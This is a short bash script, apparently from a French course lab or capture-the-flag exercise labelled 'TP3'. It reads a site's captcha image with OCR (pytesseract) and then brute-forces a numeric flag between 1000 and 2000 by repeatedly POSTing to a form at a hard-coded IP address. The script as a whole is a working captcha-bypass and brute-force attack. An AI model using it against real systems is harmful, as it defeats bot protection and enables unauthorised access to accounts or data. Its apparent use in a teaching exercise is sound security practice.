#!/bin/bash

echo "=== BRUTEFORCE TP3 FLAG ==="

rm -f cookies.txt captcha_now.png

# GET page
curl -c cookies.txt http://31.220.95.27:9002/captcha1/ > /dev/null 2>&1

# GET captcha
curl -b cookies.txt http://31.220.95.27:9002/captcha.php > captcha_now.png 2>&1

# OCR
CAPTCHA=$(poetry run python -c "from PIL import Image; import pytesseract; print(pytesseract.image_to_string(Image.open('captcha_now.png')).strip())" 2>/dev/null)

echo "CAPTCHA lu: $CAPTCHA"
echo ""
echo "Bruteforce du flag (1000-2000)..."

# Bruteforce
for flag in {1000..2000}; do
    echo -n "Testing flag $flag... "
    
    response=$(curl -s -b cookies.txt -X POST http://31.220.95.27:9002/captcha1/ \
      -d "flag=$flag&captcha=$CAPTCHA&submit=")
    
    if echo "$response" | grep -q "alert-success"; then
        echo "✅ FLAG TROUVÉ !"
        echo "$response" | grep -oP '(?<=<p class="alert-success[^>]*>)[^<]+' || echo "$response" | grep "alert-success"
        exit 0
    elif echo "$response" | grep -q "Incorrect flag"; then
        echo "❌"
    elif echo "$response" | grep -q "Invalid captcha"; then
        echo "❌ CAPTCHA invalide (timeout)"
        break
    else
        echo "?"
    fi
done

echo ""
echo "Aucun flag trouvé entre 1000 et 2000"
